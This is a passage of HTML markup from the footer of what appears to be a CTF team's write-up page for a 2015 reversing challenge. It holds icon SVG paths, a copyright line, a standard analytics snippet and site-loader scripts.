109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a></li><li><a href="https://github.com/ByteBandits/"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></li></ul><ul class="footer-module--copyright--1-FxK"><li>© <!-- -->2019<!-- -->, ByteBandits</li></ul><div class="footer-module--gotop--35bFg"><a title="Back to Top" href="#top"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M240.971 130.524l194.343 194.343c9.373 9.373 9.373 24.569 0 33.941l-22.667 22.667c-9.357 9.357-24.522 9.375-33.901.04L224 227.495 69.255 381.516c-9.379 9.335-24.544 9.317-33.901-.04l-22.667-22.667c-9.373-9.373-9.373-24.569 0-33.941L207.03 130.525c9.372-9.373 24.568-9.373 33.941-.001z"></path></svg></a></div></footer></div></div><script>
  
  
  if(true) {
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  }
  if (typeof ga === "function") {
    ga('create', 'UA-136974496-1', 'auto', {});
      
      
      
      
      
      }</script><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/writeups/ekoparty-ctf-2015/reversing/Malware/sudhackar";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"app":["/app-edafdb8a87528133144b.js"],"component---src-templates-writeup-js":["/component---src-templates-writeup-js-7c0407b776346122acce.js"],"component---src-pages-404-js":["/component---src-pages-404-js-0e1a1157ac8a3978142f.js"],"component---src-pages-index-js":["/component---src-pages-index-js-ceda62c7bfba8fa94d19.js"],"component---src-pages-team-js":["/component---src-pages-team-js-349759106a88f3a696e9.js"],"component---src-pages-writeups-js":["/component---src-pages-writeups-js-19eb80446681f4b7da31.js"]};/*]]>*/</script><script src="/component---src-templates-writeup-js-7c0407b776346122acce.js" async=""></script><script src="/commons-4d3d2db350e8cd5683e5.js" async=""></script><script src="/styles-33e987324329888a5c26.js" async=""></script><script src="/app-edafdb8a87528133144b.js" async=""></script><script src="/webpack-runtime-2d51d0099acd9d66f9d7.js" async=""></script></body></html>